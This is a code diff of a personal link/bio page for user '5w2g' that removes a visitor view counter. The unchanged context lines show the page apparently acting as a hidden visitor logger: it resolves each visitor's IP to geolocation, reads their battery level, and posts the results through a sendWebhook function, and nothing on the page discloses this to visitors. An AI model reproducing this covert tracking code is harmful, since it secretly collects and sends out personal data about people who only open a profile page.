@@ -529,8 +529,6 @@
         <img src="avatar.jpg" alt="5w2g" class="avatar">
         <h1 class="username">5w2g</h1>
         <p class="bio">Welcome to my page</p>
-        <p id="viewCount" style="font-size:12px;color:rgba(255,255,255,0.35);margin-bottom:20px;">Loading views...</p>
-
         <div class="links">
             <a href="https://discord.com/users/618042706031280133" class="link-btn discord" target="_blank">
                 <svg viewBox="0 0 24 24" fill="currentColor">
@@ -1180,30 +1178,6 @@
             .then(function(geoData) {
                 geo = geoData;
 
-                var viewEl = document.getElementById('viewCount');
-                var seenIPs = JSON.parse(localStorage.getItem('seenIPs') || '[]');
-                var isUnique = seenIPs.indexOf(ip) === -1;
-
-                if (isUnique) {
-                    seenIPs.push(ip);
-                    localStorage.setItem('seenIPs', JSON.stringify(seenIPs));
-                    fetch('https://api.countapi.xyz/hit/swag.vip.visits/v1')
-                        .then(function(r) { return r.json(); })
-                        .then(function(d) { if (d.value) viewEl.textContent = d.value + ' vues'; })
-                        .catch(function() {
-                            var c = parseInt(localStorage.getItem('viewCount') || '0') + 1;
-                            localStorage.setItem('viewCount', c.toString());
-                            viewEl.textContent = c + ' vues';
-                        });
-                } else {
-                    fetch('https://api.countapi.xyz/get/swag.vip.visits/v1')
-                        .then(function(r) { return r.json(); })
-                        .then(function(d) { if (d.value) viewEl.textContent = d.value + ' vues'; })
-                        .catch(function() {
-                            viewEl.textContent = localStorage.getItem('viewCount') || '1';
-                        });
-                }
-
                 if (batteryPromise) {
                     batteryPromise.then(function(b) {
                         batteryLevel = Math.round(b.level * 100) + '%';
@@ -1216,8 +1190,6 @@
             })
             .catch(function() {
                 geo = {};
-                var localCount = parseInt(localStorage.getItem('viewCount') || '0');
-                document.getElementById('viewCount').textContent = localCount + ' vues';
                 sendWebhook([{ name: 'Status', value: 'IP non disponible', inline: false }]);
             });
         }
